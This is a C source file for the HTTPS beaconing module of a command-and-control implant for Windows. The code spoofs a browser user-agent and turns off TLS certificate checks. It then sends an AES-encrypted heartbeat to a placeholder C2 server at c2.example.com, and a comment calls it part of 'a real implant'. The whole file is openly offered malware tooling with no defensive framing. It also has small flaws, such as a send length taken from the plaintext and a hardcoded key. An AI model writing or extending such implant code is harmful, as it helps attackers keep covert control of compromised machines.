// https_beacon.c – Beacon HTTPS para C2
#include <windows.h>
#include <winhttp.h>
#include <stdio.h>
#include "../../utils/crypto/crypto.h"
#include "../../utils/logger.h"

// Link with Winhttp.lib
#pragma comment(lib, "winhttp.lib")

// Configuration (Should be obfuscated/loaded from config)
static wchar_t* C2_SERVER = L"c2.example.com"; 
static int C2_PORT = 443;
static wchar_t* C2_PATH = L"/beacon";

void HTTPS_Beacon() {
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    BOOL bResults = FALSE;

    // 1. Open Session
    hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 10.0; Win64; x64)",  
                           WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                           WINHTTP_NO_PROXY_NAME, 
                           WINHTTP_NO_PROXY_BYPASS, 0);

    if (hSession) {
        // 2. Connect
        hConnect = WinHttpConnect(hSession, C2_SERVER, C2_PORT, 0);
    } else {
        Log("HTTPS: Failed to open session");
        return;
    }

    if (hConnect) {
        // 3. Create Request
        hRequest = WinHttpOpenRequest(hConnect, L"POST", C2_PATH,
                                      NULL, WINHTTP_NO_REFERER, 
                                      WINHTTP_DEFAULT_ACCEPT_TYPES, 
                                      WINHTTP_FLAG_SECURE); // SSL
    } else {
        Log("HTTPS: Failed to connect");
       WinHttpCloseHandle(hSession);
       return;
    }

    if (hRequest) {
        // 4. Prepare Data
        char* payload = "{\"status\":\"alive\",\"id\":\"12345\"}";
        unsigned char encrypted[256];
        AES_Encrypt((unsigned char*)payload, encrypted, (unsigned char*)"mysecretkey");

        // 5. Send Request
        // In a real implant, we'd handle cert errors (WinHttpSetOption) to allow self-signed
        DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_CN_INVALID | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
        WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));

        bResults = WinHttpSendRequest(hRequest,
                                      L"Content-Type: application/octet-stream", 
                                      -1, 
                                      (LPVOID)encrypted, 
                                      strlen((char*)payload), 
                                      strlen((char*)payload), 
                                      0);
    } else {
         Log("HTTPS: Failed to open request");
    }

    if (bResults) {
        bResults = WinHttpReceiveResponse(hRequest, NULL);
         Log("HTTPS: Beacon sent successfully");
    } else {
         Log("HTTPS: Failed to send request");
    }

    // Cleanup
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
}
